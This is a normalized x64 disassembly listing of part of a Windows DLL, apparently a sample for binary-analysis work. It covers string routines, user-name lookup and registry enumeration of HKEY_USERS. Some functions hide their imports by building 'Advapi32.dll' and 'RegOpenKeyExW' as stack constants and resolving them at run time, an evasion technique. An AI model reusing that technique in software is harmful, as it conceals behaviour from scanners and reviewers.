mov rbx [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop r12
pop rbp
retn
lea rdi [ r8 + rsi ]
mov rax 0x7ffffffffffffffe
cmp rdi rax
jbe r-xdata
mov rcx [ rcx + 0x18 ]
cmp rcx rdi
jae r-xdata
lea rcx [ r--data ]
call sub_18001c17c
test rdi rdi
jne r-xdata
mov rdx rdi
mov rcx rbx
call sub_180001330
test rdi rdi
je r-xdata
mov rax [ rbx + 0x18 ]
cmp rax 0x8
jb r-xdata
xor eax eax
mov [ rbx + 0x10 ] rax
cmp rcx 0x8
jb r-xdata
mov rdx rbx
mov rdx [ rbx ]
jmp r-xdata
mov rcx rbx
mov [ rbx ] ax
jmp r-xdata
mov rcx [ rbx ]
mov [ rcx ] ax
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
cmp rax 0x8
jb r-xdata
cmp [ r12 + 0x18 ] 0x8
jb r-xdata
cmp r13 rbp
jae r-xdata
mov r8 [ rbx + 0x10 ]
lea rax [ r13 + rsi ]
lea rdx [ rdx + r13 * 2 ]
sub r8 r13
lea rcx [ rcx + rax * 2 ]
add r8 r8
call sub_18001c4a0
cmp rbx r12
jne r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov r12 [ r12 ]
mov rax [ rbx + 0x18 ]
cmp rax 0x8
jb r-xdata
add rbp rsi
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
lea r8 [ rsi + rsi ]
lea rdx [ r12 + rbp * 2 ]
lea rcx [ rax + r13 * 2 ]
call sub_18001c4a0
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
cmp rax 0x8
jb r-xdata
xor eax eax
mov [ rcx + rdi * 2 ] ax
cmp [ rbx + 0x18 ] 0x8
mov [ rbx + 0x10 ] rdi
jb r-xdata
lea rdx [ rcx + rbp * 2 ]
lea r8 [ rsi + rsi ]
lea rcx [ rax + r13 * 2 ]
call sub_18001c4a0
jmp r-xdata
sub_18000c2b0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov ebx edx
mov rdi rcx
call sub_18000be60
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18001c80c
sub_18000c2e0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push r12
sub rsp 0x20
mov rax [ rdx + 0x10 ]
mov rbp r9
mov r12 r8
mov rsi rdx
mov rbx rcx
cmp rax r8
jae r-xdata
sub rax r8
mov r8 [ rcx + 0x10 ]
cmp rax r9
cmovb rbp rax
or rax 0xffffffffffffffff
sub rax r8
cmp rax rbp
ja r-xdata
lea rcx [ r--data ]
call sub_18001c1d8
mov [ rsp + 0x30 ] rdi
test rbp rbp
je r-xdata
lea rcx [ r--data ]
call sub_18001c17c
mov rdi [ rsp + 0x30 ]
mov rbp [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop r12
retn
lea rdi [ r8 + rbp ]
mov rax 0x7ffffffffffffffe
cmp rdi rax
jbe r-xdata
mov rcx [ rcx + 0x18 ]
cmp rcx rdi
jae r-xdata
lea rcx [ r--data ]
call sub_18001c17c
test rdi rdi
jne r-xdata
mov rdx rdi
mov rcx rbx
call sub_180001330
test rdi rdi
je r-xdata
cmp [ rsi + 0x18 ] 0x8
jb r-xdata
xor eax eax
mov [ rbx + 0x10 ] rax
cmp rcx 0x8
jb r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rsi [ rsi ]
mov rcx rbx
mov [ rbx ] ax
jmp r-xdata
mov rcx [ rbx ]
mov [ rcx ] ax
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rax [ rbx + 0x10 ]
lea r8 [ rbp + rbp ]
lea rdx [ rsi + r12 * 2 ]
lea rcx [ rcx + rax * 2 ]
call sub_18001c4a0
cmp [ rbx + 0x18 ] 0x8
mov [ rbx + 0x10 ] rdi
jb r-xdata
xor eax eax
mov [ rcx + rdi * 2 ] ax
sub_18000c410
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x50
xor eax eax
mov ebx edx
mov rdi rcx
mov esi r8d
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
xor r8d r8d
mov [ rsp + 0x38 ] 0x7
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x20 ] ax
call sub_180003b50
mov r11 [ rdi ]
lea r8 [ rsp + 0x20 ]
mov r9d ebx
mov edx esi
mov rcx rdi
call [ r11 + 0x18 ]
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
add rsp 0x50
pop rdi
retn
sub_18000c480
push rbx
sub rsp 0x20
mov rbx rcx
lea rdx [ rcx + 0x8 ]
mov rcx [ rcx + 0xd0 ]
call sub_18000eea0
test al al
je r-xdata
xor eax eax
add rsp 0x20
pop rbx
retn
mov rcx [ rbx + 0xd0 ]
lea r8 [ rsp + 0x30 ]
lea rdx [ rsp + 0x38 ]
mov [ rsp + 0x38 ] 0x0
mov [ rsp + 0x30 ] 0x0
call sub_18000eae0
test al al
je r-xdata
mov rcx [ rbx + 0xd0 ]
call sub_18000e6c0
mov edx [ rw-data ]
lea rcx [ rbx - 0x8 ]
mov r8d eax
call sub_18000c410
mov ecx 0x10
call sub_18001c84c
mov r11 rax
test rax rax
je r-xdata
xor r11d r11d
mov eax r11d
add rsp 0x20
pop rbx
retn
mov rax [ rsp + 0x38 ]
mov ecx [ rsp + 0x30 ]
mov [ r11 ] rax
mov rax r11
mov [ r11 + 0x8 ] rcx
add rsp 0x20
pop rbx
retn
sub_18000c530
mov rax rsp
push rbp
lea rbp [ rax - 0x5f ]
sub rsp 0xc0
mov [ rbp - 0x31 ] 0xfffffffffffffffe
mov [ rax + 0x18 ] rbx
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x47 ] rax
mov rbx rdx
xor edi edi
mov [ rbp - 0x39 ] rdi
mov [ rbp - 0x11 ] 0x7
mov [ rbp - 0x19 ] rdi
mov [ rbp - 0x29 ] di
lea rdx [ rcx + 0xb0 ]
or r9 0xffffffffffffffff
xor r8d r8d
lea rcx [ rbp - 0x29 ]
call sub_180001ac0
nop
mov [ rbp + 0x17 ] 0x7
mov [ rbp + 0xf ] rdi
mov [ rbp - 0x1 ] di
lea r8d [ rdi + 0x1 ]
lea rdx [ r--data ]
lea rcx [ rbp - 0x1 ]
call sub_180003b50
nop
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp - 0x1 ]
lea rcx [ rbp - 0x29 ]
call sub_18000c2e0
nop
cmp [ rbp + 0x17 ] 0x8
jb r-xdata
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rbx
lea rcx [ rbp - 0x29 ]
call sub_18000c2e0
mov [ rbp + 0x27 ] 0x61766441
mov [ rbp + 0x2b ] 0x32336970
mov [ rbp + 0x2f ] 0x6c6c642e
mov [ rbp + 0x33 ] 0x0
lea rcx [ rbp + 0x27 ]
call [ GetModuleHandleA@IAT ]
test rax rax
jne r-xdata
mov rcx [ rbp - 0x1 ]
call j_sub_18001c80c
mov [ rbp + 0x37 ] 0x4f676552
mov [ rbp + 0x3b ] 0x4b6e6570
mov [ rbp + 0x3f ] 0x78457965
mov [ rbp + 0x43 ] 0x57
lea rdx [ rbp + 0x37 ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
jne r-xdata
lea rcx [ rbp + 0x27 ]
call [ LoadLibraryA@IAT ]
test rax rax
jne r-xdata
lea rdx [ rbp - 0x29 ]
cmp [ rbp - 0x11 ] 0x8
cmovae rdx [ rbp - 0x29 ]
lea rcx [ rbp - 0x39 ]
mov [ rsp + 0x20 ] rcx
mov r9d 0xf003f
xor r8d r8d
mov rcx 0xffffffff80000003
call rax
mov rbx [ rbp - 0x39 ]
cmp eax 0x2
jne r-xdata
mov rbx [ rbp - 0x39 ]
jmp r-xdata
mov rbx [ rbp - 0x39 ]
jmp r-xdata
cmp [ rbp - 0x11 ] 0x8
jb r-xdata
jmp r-xdata
mov rax rbx
mov rcx [ rbp + 0x47 ]
xor rcx rsp
call sub_18001d1f0
lea r11 [ rsp + 0xc0 ]
mov rbx [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
mov rcx [ rbp - 0x29 ]
call j_sub_18001c80c
sub_18000c6d0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x30
mov rax [ rdx + 0x18 ]
mov r10 r8
mov r8 [ rdx + 0x10 ]
mov r9 [ r10 + 0x10 ]
xor edi edi
sub rax r8
mov r11 rdx
mov rbx rcx
mov [ rsp + 0x48 ] edi
cmp r9 rax
jbe r-xdata
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx r10
mov rcx r11
call sub_18000c2e0
mov rax [ r10 + 0x18 ]
sub rax r9
cmp rax r8
jb r-xdata
mov r8 rdx
xor r9d r9d
mov rcx r10
xor edx edx
mov [ rsp + 0x20 ] 0xffffffffffffffff
call sub_18000c0f0
jmp r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rdi
mov rdx rax
mov rcx rbx
mov [ rbx ] di
call sub_180003f60
mov rax rbx
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
sub_18000c760
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rax r8
mov r10 rdx
mov rbx rcx
xor edi edi
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rax
mov rcx r10
mov [ rsp + 0x30 ] edi
call sub_18000c2e0
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rdi
mov rcx rbx
mov rdx rax
mov [ rbx ] di
call sub_180003f60
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_18000c7c0
mov [ rsp + 0x8 ] rcx
push rsi
push rdi
push r12
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x68 ] rbp
mov rsi r8
mov rbp rdx
mov rbx rcx
xor r12d r12d
mov [ rsp + 0x58 ] r12d
mov [ rcx + 0x18 ] 0x7
mov [ rcx + 0x10 ] r12
mov [ rcx ] r12w
mov [ rsp + 0x58 ] 0x1
mov rdx [ r8 + 0x10 ]
add rdx [ rbp + 0x10 ]
mov rdi [ rcx + 0x10 ]
cmp rdi rdx
ja r-xdata
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rbp
mov rcx rbx
call sub_18000c2e0
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rsi
mov rcx rbx
call sub_18000c2e0
mov rax rbx
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
add rsp 0x30
pop r12
pop rdi
pop rsi
retn
cmp [ rcx + 0x18 ] rdx
je r-xdata
mov r8b 0x1
call sub_180001880
test al al
je r-xdata
mov [ rbx + 0x10 ] rdi
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov [ rax + rdi * 2 ] r12w
sub_18000c880
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x30
mov rax r8
mov rbx rcx
mov r8 rdx
xor edi edi
xor r9d r9d
xor edx edx
mov rcx rax
mov [ rsp + 0x20 ] 0xffffffffffffffff
mov [ rsp + 0x40 ] edi
call sub_18000c0f0
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rdi
mov rcx rbx
mov rdx rax
mov [ rbx ] di
call sub_180003f60
mov rax rbx
mov rbx [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
sub_18000c8e0
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0xd0
mov [ rsp + 0x40 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xc8 ] rax
mov r13 r9
mov r12 r8
mov rbx rdx
mov [ rsp + 0x28 ] rdx
mov [ rsp + 0x30 ] r8
mov [ rsp + 0x38 ] r9
xor r15d r15d
mov [ rsp + 0x20 ] r15d
mov [ rsp + 0x20 ] 0x104
mov [ rsp + 0x68 ] 0x7
mov [ rsp + 0x60 ] r15
mov [ rsp + 0x50 ] r15w
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx r13
lea rcx [ rsp + 0x50 ]
call sub_180001ac0
nop
mov ecx [ rsp + 0x20 ]
lea edx [ r15 + 0x2 ]
call sub_18001d210
mov rsi rax
test rax rax
jne r-xdata
lea rdx [ rsp + 0x20 ]
mov rcx rax
call [ GetUserNameW@IAT ]
test eax eax
je r-xdata
mov r8 r12
mov rdx r13
mov rcx rbx
call sub_18000c7c0
nop
mov rcx rsi
call sub_18001c80c
nop
mov ecx 0x40
call sub_18001c84c
mov [ rsp + 0x48 ] rax
test rax rax
je r-xdata
mov [ rsp + 0xb8 ] 0x7
mov [ rsp + 0xb0 ] r15
mov [ rsp + 0xa0 ] r15w
xor eax eax
or rcx 0xffffffffffffffff
mov rdi rsi
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rdx rsi
lea rcx [ rsp + 0xa0 ]
call sub_180003b50
nop
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rsp + 0xa0 ]
lea rcx [ rsp + 0x50 ]
call sub_18000c2e0
nop
cmp [ rsp + 0xb8 ] 0x8
jb r-xdata
mov rax rbx
jmp r-xdata
mov rcx [ rsp + 0x50 ]
call j_sub_18001c80c
mov rdi r15
mov rcx rax
call sub_18000a7a0
mov rdi rax
jmp r-xdata
mov rcx [ rsp + 0xa0 ]
call j_sub_18001c80c
mov rcx [ rsp + 0xc8 ]
xor rcx rsp
call sub_18001d1f0
add rsp 0xd0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
lea rdx [ rsp + 0x50 ]
cmp [ rsp + 0x68 ] 0x8
cmovae rdx [ rsp + 0x50 ]
mov r8d [ rsp + 0x60 ]
add r8d r8d
movzx esi [ rsp + 0x130 ]
movzx ecx si
call sub_18000a3b0
movzx r14d ax
shl r14d 0x10
movzx eax si
xor r14d eax
mov rax [ rdi ]
mov edx 0x1
mov rcx rdi
call [ rax ]
nop
mov edx 0x2
lea ecx [ rdx + 0x8 ]
call sub_18001d210
mov rsi rax
test rax rax
jne r-xdata
mov r8 r12
mov rdx r13
mov rcx rbx
call sub_18000c7c0
nop
cmp [ rsp + 0x68 ] 0x8
jb r-xdata
test rdi rdi
jne r-xdata
mov r9d r14d
lea r8 [ r--data ]
mov edx 0xa
mov rcx rax
call sub_18001d620
mov [ rsp + 0xb8 ] 0x7
mov [ rsp + 0xb0 ] r15
mov [ rsp + 0xa0 ] r15w
xor eax eax
or rcx 0xffffffffffffffff
mov rdi rsi
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rdx rsi
lea rcx [ rsp + 0xa0 ]
call sub_180003b50
nop
mov r8 r12
lea rdx [ rsp + 0xa0 ]
lea rcx [ rsp + 0x78 ]
call sub_18000c760
nop
cmp [ rsp + 0xb8 ] 0x8
jb r-xdata
mov r8 r12
mov rdx r13
mov rcx rbx
call sub_18000c7c0
nop
jmp r-xdata
mov [ rsp + 0x68 ] 0x7
mov [ rsp + 0x60 ] r15
mov [ rsp + 0x50 ] r15w
mov rax rbx
jmp r-xdata
mov rcx [ rsp + 0x50 ]
call j_sub_18001c80c
mov rcx rsi
call sub_18001c80c
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r15
mov [ rbx ] r15w
lea rax [ rsp + 0x78 ]
cmp rbx rax
je r-xdata
mov rcx [ rsp + 0xa0 ]
call j_sub_18001c80c
cmp [ rsp + 0x68 ] 0x8
jb r-xdata
mov rax [ rsp + 0x90 ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov [ rsp + 0x90 ] 0x7
mov [ rsp + 0x88 ] r15
mov [ rsp + 0x78 ] r15w
jmp r-xdata
mov rcx [ rsp + 0x78 ]
call j_sub_18001c80c
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r15
mov [ rbx ] r15w
mov rcx [ rsp + 0x90 ]
cmp rcx 0x8
jae r-xdata
mov rcx [ rbx ]
call j_sub_18001c80c
mov rax [ rsp + 0x78 ]
mov [ rbx ] rax
mov [ rsp + 0x78 ] r15
mov r8 [ rsp + 0x88 ]
lea r8 [ r8 + r8 + 0x2 ]
lea rdx [ rsp + 0x78 ]
mov rcx rbx
call sub_18001c4a0
mov rcx [ rsp + 0x90 ]
jmp r-xdata
cmp rax 0x8
jb r-xdata
mov rax [ rsp + 0x88 ]
mov [ rbx + 0x10 ] rax
mov [ rbx + 0x18 ] rcx
mov eax 0x7
mov [ rsp + 0x90 ] rax
mov [ rsp + 0x88 ] r15
mov [ rsp + 0x78 ] r15w
jmp r-xdata
sub_18000cc6d
cmp [ rsp + 0x68 ] 0x8
jb r-xdata
mov rax [ rsp + 0x28 ]
mov rcx [ rsp + 0xc8 ]
xor rcx rsp
call sub_18001d1f0
add rsp 0xd0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
mov rcx [ rsp + 0x50 ]
call j_sub_18001c80c
sub_18000ccb0
mov rax rsp
push rbp
push r12
push r13
lea rbp [ rax - 0x7c8 ]
sub rsp 0x8b0
mov [ rsp + 0x50 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x7a0 ] rax
mov rbx rdx
xor r13d r13d
mov [ rsp + 0x40 ] r13d
mov esi 0x7
mov [ rsp + 0x78 ] rsi
mov [ rsp + 0x70 ] r13
mov [ rsp + 0x60 ] r13w
xor r8d r8d
lea rdx [ r--data ]
lea rcx [ rsp + 0x60 ]
call sub_180003b50
nop
mov [ rbp - 0x50 ] 0x61766441
mov [ rbp - 0x4c ] 0x32336970
mov [ rbp - 0x48 ] 0x6c6c642e
mov [ rbp - 0x44 ] r13b
lea rcx [ rbp - 0x50 ]
call [ GetModuleHandleA@IAT ]
test rax rax
jne r-xdata
mov [ rbp - 0x40 ] 0x4f676552
mov [ rbp - 0x3c ] 0x4b6e6570
mov [ rbp - 0x38 ] 0x78457965
mov [ rbp - 0x34 ] 0x57
lea rdx [ rbp - 0x40 ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
jne r-xdata
lea rcx [ rbp - 0x50 ]
call [ LoadLibraryA@IAT ]
test rax rax
jne r-xdata
lea rcx [ rsp + 0x48 ]
mov [ rsp + 0x20 ] rcx
mov r9d 0x20019
xor r8d r8d
xor edx edx
mov rcx 0xffffffff80000003
call rax
test eax eax
je r-xdata
mov [ rbx + 0x18 ] rsi
mov [ rbx + 0x10 ] r13
mov [ rbx ] r13w
xor r8d r8d
lea rdx [ r--data ]
mov rcx rbx
call sub_180003b50
nop
cmp [ rsp + 0x78 ] 0x8
jmp r-xdata
mov [ rbx + 0x18 ] rsi
mov [ rbx + 0x10 ] r13
mov [ rbx ] r13w
xor r8d r8d
lea rdx [ r--data ]
mov rcx rbx
call sub_180003b50
nop
cmp [ rsp + 0x78 ] 0x8
jmp r-xdata
mov [ rbp - 0x30 ] r13w
xor edx edx
mov r8d 0x7ce
lea rcx [ rbp - 0x2e ]
call sub_18001c9f0
mov edi r13d
mov [ rsp + 0x40 ] 0x3e8
mov [ rsp + 0x38 ] r13
mov [ rsp + 0x30 ] r13
mov [ rsp + 0x28 ] r13
mov [ rsp + 0x20 ] r13
lea r9 [ rsp + 0x40 ]
lea r8 [ rbp - 0x30 ]
xor edx edx
mov rcx [ rsp + 0x48 ]
call [ RegEnumKeyExW@IAT ]
test eax eax
jne r-xdata
mov [ rbx + 0x18 ] rsi
mov [ rbx + 0x10 ] r13
mov [ rbx ] r13w
lea rax [ rsp + 0x60 ]
cmp rbx rax
je r-xdata
jb r-xdata
cmp eax 0x103
jne r-xdata
cmp [ rsp + 0x40 ] 0x9
ja r-xdata
mov rsi [ rsp + 0x78 ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rax rbx
mov rcx [ rbp + 0x7a0 ]
xor rcx rsp
call sub_18001d1f0
lea r11 [ rsp + 0x8b0 ]
mov rbx [ r11 + 0x20 ]
mov rsi [ r11 + 0x30 ]
mov rdi [ r11 + 0x38 ]
mov rsp r11
pop r13
pop r12
pop rbp
retn
mov rcx [ rsp + 0x60 ]
call j_sub_18001c80c
mov rcx [ rsp + 0x48 ]
call [ RegCloseKey@IAT ]
mov [ rbx + 0x18 ] rsi
mov [ rbx + 0x10 ] r13
mov [ rbx ] r13w
lea rax [ rsp + 0x60 ]
cmp rbx rax
je r-xdata
mov ecx 0x30
call sub_18001c84c
mov [ rsp + 0x58 ] rax
test rax rax
je r-xdata
mov [ rbp - 0x60 ] rsi
mov [ rbp - 0x68 ] r13
mov [ rbp - 0x78 ] r13w
xor eax eax
or rcx 0xffffffffffffffff
lea rdi [ rbp - 0x30 ]
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rdx [ rbp - 0x30 ]
lea rcx [ rbp - 0x78 ]
call sub_180003b50
nop
cmp [ rsp + 0x78 ] 0x8
jb r-xdata
inc edi
mov [ rsp + 0x40 ] 0x3e8
mov [ rsp + 0x38 ] r13
mov [ rsp + 0x30 ] r13
mov [ rsp + 0x28 ] r13
mov [ rsp + 0x20 ] r13
lea r9 [ rsp + 0x40 ]
lea r8 [ rbp - 0x30 ]
mov edx edi
mov rcx [ rsp + 0x48 ]
call [ RegEnumKeyExW@IAT ]
test eax eax
je r-xdata
cmp rsi 0x8
mov [ rbx + 0x18 ] rsi
mov [ rbx + 0x10 ] r13
mov [ rbx ] r13w
mov rcx [ rsp + 0x78 ]
cmp rcx 0x8
jae r-xdata
mov rcx [ rbx ]
call j_sub_18001c80c
mov rsi [ rsp + 0x78 ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov r12 r13
mov rcx rax
call sub_180008850
mov r12 rax
jmp r-xdata
mov [ rsp + 0x78 ] rsi
mov [ rsp + 0x70 ] r13
mov [ rsp + 0x60 ] r13w
mov rcx [ rbp - 0x60 ]
cmp rcx 0x8
jae r-xdata
mov rcx [ rsp + 0x60 ]
call j_sub_18001c80c
jmp r-xdata
mov rax [ rsp + 0x60 ]
mov [ rbx ] rax
mov [ rsp + 0x60 ] r13
mov r8 [ rsp + 0x70 ]
lea r8 [ r8 + r8 + 0x2 ]
lea rdx [ rsp + 0x60 ]
mov rcx rbx
call sub_18001c4a0
mov rcx [ rsp + 0x78 ]
jmp r-xdata
mov [ rbx + 0x18 ] rsi
mov [ rbx + 0x10 ] r13
mov [ rbx ] r13w
mov rcx [ rsp + 0x78 ]
cmp rcx 0x8
jae r-xdata
mov rcx [ rbx ]
call j_sub_18001c80c
cmp [ rbp - 0x60 ] 0x8
jb r-xdata
cmp [ rsp + 0x78 ] 0x8
jb r-xdata
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx r12
call sub_1800088d0
mov r8d 0x12
lea rdx [ rw-data ]
mov rcx r12
call sub_1800088c0
lea rdx [ rbp - 0x78 ]
mov rcx r12
call sub_1800092e0
mov rdi rax
lea rax [ rsp + 0x60 ]
cmp rax rdi
je r-xdata
mov rax [ rbp - 0x78 ]
mov [ rsp + 0x60 ] rax
mov r8 [ rbp - 0x68 ]
lea r8 [ r8 + r8 + 0x2 ]
lea rdx [ rbp - 0x78 ]
lea rcx [ rsp + 0x60 ]
call sub_18001c4a0
mov rcx [ rbp - 0x60 ]
jmp r-xdata
jmp r-xdata
mov rax [ rsp + 0x70 ]
mov [ rbx + 0x10 ] rax
mov [ rbx + 0x18 ] rcx
mov [ rsp + 0x78 ] rsi
mov [ rsp + 0x70 ] r13
mov [ rsp + 0x60 ] r13w
jmp r-xdata
mov rax [ rsp + 0x60 ]
mov [ rbx ] rax
mov [ rsp + 0x60 ] r13
mov r8 [ rsp + 0x70 ]
lea r8 [ r8 + r8 + 0x2 ]
lea rdx [ rsp + 0x60 ]
mov rcx rbx
call sub_18001c4a0
mov rcx [ rsp + 0x78 ]
jmp r-xdata
test r12 r12
je r-xdata
mov rcx [ rbp - 0x78 ]
call j_sub_18001c80c
mov [ rsp + 0x78 ] rsi
mov [ rsp + 0x70 ] r13
mov [ rsp + 0x60 ] r13w
cmp [ rdi + 0x18 ] 0x8
jae r-xdata
mov rcx [ rsp + 0x60 ]
call j_sub_18001c80c
mov rsi [ rsp + 0x78 ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rax [ rbp - 0x68 ]
mov [ rsp + 0x70 ] rax
mov [ rsp + 0x78 ] rcx
mov rcx [ rsp + 0x48 ]
call [ RegCloseKey@IAT ]
mov [ rbx + 0x18 ] rsi
mov [ rbx + 0x10 ] r13
mov [ rbx ] r13w
lea rax [ rsp + 0x60 ]
cmp rbx rax
je r-xdata
mov rax [ rsp + 0x70 ]
mov [ rbx + 0x10 ] rax
mov [ rbx + 0x18 ] rcx
mov [ rsp + 0x78 ] rsi
mov [ rsp + 0x70 ] r13
mov [ rsp + 0x60 ] r13w
jmp r-xdata
mov rcx r12
call sub_180008890
mov rcx r12
call j_sub_18001c80c
mov rax [ rdi ]
mov [ rsp + 0x60 ] rax
mov [ rdi ] r13
mov r8 [ rdi + 0x10 ]
inc r8
add r8 r8
mov rdx rdi
lea rcx [ rsp + 0x60 ]
call sub_18001c4a0
jmp r-xdata
mov [ rbx + 0x18 ] rsi
mov [ rbx + 0x10 ] r13
mov [ rbx ] r13w
mov rcx [ rsp + 0x78 ]
cmp rcx 0x8
jae r-xdata
mov rcx [ rbx ]
call j_sub_18001c80c
mov rax [ rdi + 0x10 ]
mov [ rsp + 0x70 ] rax
mov rax [ rdi + 0x18 ]
mov [ rsp + 0x78 ] rax
mov [ rdi + 0x18 ] rsi
mov [ rdi + 0x10 ] r13
mov [ rdi ] r13w
mov rax [ rsp + 0x60 ]
mov [ rbx ] rax
mov [ rsp + 0x60 ] r13
mov r8 [ rsp + 0x70 ]
lea r8 [ r8 + r8 + 0x2 ]
lea rdx [ rsp + 0x60 ]
mov rcx rbx
call sub_18001c4a0
mov rcx [ rsp + 0x78 ]
jmp r-xdata
jmp r-xdata
mov rax [ rsp + 0x70 ]
mov [ rbx + 0x10 ] rax
mov [ rbx + 0x18 ] rcx
mov [ rsp + 0x78 ] rsi
mov [ rsp + 0x70 ] r13
mov [ rsp + 0x60 ] r13w
jmp r-xdata
sub_18000d230
push rbp
push rsi
push rdi
sub rsp 0x80
mov [ rsp + 0x38 ] 0xfffffffffffffffe
mov [ rsp + 0xb8 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x78 ] rax
mov ebp r8d
mov rbx rdx
mov [ rsp + 0x40 ] rdx
call sub_18000c530
mov rsi rax
test rax rax
jne r-xdata
xor edi edi
mov [ rsp + 0x48 ] di
xor eax eax
mov [ rsp + 0x4a ] rax
mov [ rsp + 0x52 ] rax
mov [ rsp + 0x5a ] rax
mov [ rsp + 0x62 ] rax
mov [ rsp + 0x6a ] rax
mov [ rsp + 0x72 ] eax
mov [ rsp + 0x76 ] ax
mov [ rsp + 0x30 ] edi
mov [ rsp + 0x34 ] 0x4
mov r9d ebp
lea r8 [ r--data ]
lea edx [ rdi + 0x18 ]
lea rcx [ rsp + 0x48 ]
call sub_18001d620
lea r11 [ rsp + 0x34 ]
mov [ rsp + 0x28 ] r11
lea rax [ rsp + 0x30 ]
mov [ rsp + 0x20 ] rax
xor r9d r9d
xor r8d r8d
lea rdx [ rsp + 0x48 ]
mov rcx rsi
call [ RegQueryValueExW@IAT ]
mov rcx rsi
test eax eax
je r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
call [ RegCloseKey@IAT ]
mov esi [ rsp + 0x30 ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
call [ RegCloseKey@IAT ]
nop
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
xor edi edi
xor eax eax
jmp r-xdata
mov rcx [ rbx ]
call j_sub_18001c80c
mov eax esi
mov rcx [ rbx ]
call j_sub_18001c80c
xor eax eax
jmp r-xdata
mov rcx [ rbx ]
call j_sub_18001c80c
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rdi
mov [ rbx ] di
mov rcx [ rsp + 0x78 ]
xor rcx rsp
call sub_18001d1f0
mov rbx [ rsp + 0xb8 ]
add rsp 0x80
pop rdi
pop rsi
pop rbp
retn
sub_18000d370
push rbp
push rsi
push rdi
sub rsp 0x80
mov [ rsp + 0x38 ] 0xfffffffffffffffe
mov [ rsp + 0xb8 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x78 ] rax
mov ebp r8d
mov rbx rdx
mov [ rsp + 0x40 ] rdx
call sub_18000c530
mov rsi rax
test rax rax
jne r-xdata
xor edi edi
mov [ rsp + 0x48 ] di
xor eax eax
mov [ rsp + 0x4a ] rax
mov [ rsp + 0x52 ] rax
mov [ rsp + 0x5a ] rax
mov [ rsp + 0x62 ] rax
mov [ rsp + 0x6a ] rax
mov [ rsp + 0x72 ] eax
mov [ rsp + 0x76 ] ax
mov r9d ebp
lea r8 [ r--data ]
lea edx [ rdi + 0x18 ]
lea rcx [ rsp + 0x48 ]
call sub_18001d620
